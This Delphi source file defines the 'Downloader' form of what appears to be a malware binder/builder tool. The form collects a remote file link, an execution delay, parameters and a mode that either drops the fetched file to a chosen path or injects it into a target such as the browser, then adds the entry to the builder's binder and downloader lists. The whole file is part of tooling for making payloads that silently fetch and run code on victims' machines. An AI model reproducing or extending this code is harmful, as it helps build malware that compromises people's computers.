unit U_FrmDownloader;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs,U_FrmMain, bsSkinBoxCtrls, bsSkinCtrls, StdCtrls, Mask,
  BusinessSkinForm, se_form, ComCtrls;

type
  TFrm_Downloader = class(TForm)
    FDW_Panel: TbsSkinExPanel;
    FDW_LabelFile: TbsSkinStdLabel;
    FDW_LabelExec: TbsSkinStdLabel;
    FDW_LabelDelay: TbsSkinStdLabel;
    FDW_LabelDelayMS: TbsSkinStdLabel;
    FDW_LabelParam: TbsSkinStdLabel;
    FDW_EditFile: TbsSkinEdit;
    FDW_ComboExec: TbsSkinComboBox;
    FDW_GroupBox: TbsSkinGroupBox;
    FDW_L_ExecPath: TbsSkinStdLabel;
    FDW_L_ExecName: TbsSkinStdLabel;
    FDW_C_ExecPath: TbsSkinComboBox;
    FDW_C_ExecName: TbsSkinEdit;
    FDW_BtnAdd: TbsSkinButton;
    FDW_BtnCancel: TbsSkinButton;
    FDW_EditlDelay: TbsSkinNumericEdit;
    FDW_EditParam: TbsSkinEdit;
    FB_AnimeForm: TseAnimationForm;
    bsBusinessSkinForm1: TbsBusinessSkinForm;
    procedure FDW_PanelClose(Sender: TObject);
    procedure FDW_ComboExecChange(Sender: TObject);
    procedure FDW_C_ExecPathChange(Sender: TObject);
    procedure FDW_BtnCancelClick(Sender: TObject);
    procedure FDW_BtnAddClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Frm_Downloader: TFrm_Downloader;

implementation

{$R *.dfm}
uses
u_Type, u_Utils;



procedure TFrm_Downloader.FDW_BtnAddClick(Sender: TObject);
var
List :Tlistitem;
Data :PBinder;
X : String;
Size : Integer;
begin
  if FDW_Panel.Caption = 'Downloader Add' then
  begin
    if (FDW_EditFile.Text <> '') then
    begin
      Size := GetFileSizeNet(FDW_EditFile.Text);
      if (Size <> 0) then
      begin
        List := Frm_Main.List_Downloader.Items.Add;
        List.Caption := FDW_EditFile.Text;
        List.SubItems.Add(getkbs(Size));
        new(data);
        Data^.Delay := Trunc(FDW_EditlDelay.Value);
        Data^.Exec := FDW_ComboExec.ItemIndex;
        Data^.Path := FDW_C_ExecPath.ItemIndex;
        Data^.Name := FDW_C_ExecName.Text;
        Data^.Parameter := FDW_EditParam.Text;
        List.Data := Data;
        Close;
      end else
        Frm_Main.FM_Message.MessageDlg('Your File Not Exists In Site, Please Input Correct Link...!!!',mtWarning,[mbOk],0);
    end else
      Frm_Main.FM_Message.MessageDlg('Please Input Link First...!!!',mtWarning,[mbOk],0);
  end else
  if (Pos('oader Edit ',FDW_Panel.Caption) <> 0) then
  begin
    if (FDW_EditFile.Text <> '') then
    begin
      Size := GetFileSizeNet(FDW_EditFile.Text);
      if (Size <> 0) then
      begin
        X := FDW_Panel.Caption;
        delete(x,1,16);
        List := Frm_Main.List_Binder.Items.Item[strtoint(x)];
        Data := List.Data;
        List.Caption := FDW_EditFile.Text;
        List.SubItems.Add(getkbs(Size));
        Data^.Delay := Trunc(FDW_EditlDelay.Value);
        Data^.Exec := FDW_ComboExec.ItemIndex;
        Data^.Path := FDW_C_ExecPath.ItemIndex;
        Data^.Name := FDW_C_ExecName.Text;
        Data^.Parameter := FDW_EditParam.Text;
        List.Data := data;
        Close;
      end else
        Frm_Main.FM_Message.MessageDlg('Your File Not Exists In Site, Please Input Correct Link...!!!',mtWarning,[mbOk],0);
    end else
      Frm_Main.FM_Message.MessageDlg('Please Input Link First...!!!',mtWarning,[mbOk],0);
  end;
end;

procedure TFrm_Downloader.FDW_BtnCancelClick(Sender: TObject);
begin
  Close;
end;

procedure TFrm_Downloader.FDW_ComboExecChange(Sender: TObject);
begin
  if FDW_ComboExec.ItemIndex = 0 then
  begin
    FDW_L_ExecName.Enabled := false;
    FDW_L_ExecPath.Enabled := false;
    FDW_C_ExecName.Enabled := false;
    FDW_C_ExecPath.Enabled := false;
    FDW_C_ExecName.Text := '';
    FDW_C_ExecPath.ItemIndex := -1;
  end else
  if FDW_ComboExec.ItemIndex = 1 then
  begin
    FDW_GroupBox.Caption := 'Drop Destination : ';
    FDW_L_ExecName.Enabled := true;
    FDW_C_ExecName.Enabled := true;
    FDW_L_ExecPath.Enabled := true;
    FDW_C_ExecPath.Enabled := true;
    FDW_C_ExecName.Text := '';
    if FDW_C_ExecPath.Items[0] = 'Browser' then
    begin
      FDW_C_ExecPath.Items.Delete(0);
    end;
    FDW_C_ExecPath.ItemIndex := 0;
  end else
  if FDW_ComboExec.ItemIndex = 2 then
  begin
    FDW_GroupBox.Caption := 'Injection To : ';
    FDW_L_ExecPath.Enabled := true;
    FDW_C_ExecPath.Enabled := true;
    FDW_L_ExecName.Enabled := false;
    FDW_C_ExecName.Enabled := false;
    FDW_C_ExecName.Text := '';
    if FDW_C_ExecPath.Items[0] <> 'Browser' then
    begin
      FDW_C_ExecPath.Items.Insert(0,'Browser');
    end;
    FDW_C_ExecPath.ItemIndex := 0;
  end;
end;

procedure TFrm_Downloader.FDW_C_ExecPathChange(Sender: TObject);
begin
  if FDW_C_ExecPath.Text = 'Browser' then
  begin
    FDW_L_ExecName.Enabled := false;
    FDW_C_ExecName.Enabled := false;
  end else
  begin
    FDW_L_ExecName.Enabled := true;
    FDW_C_ExecName.Enabled := true;
  end;
end;

procedure TFrm_Downloader.FDW_PanelClose(Sender: TObject);
begin
  Close;
end;

end.
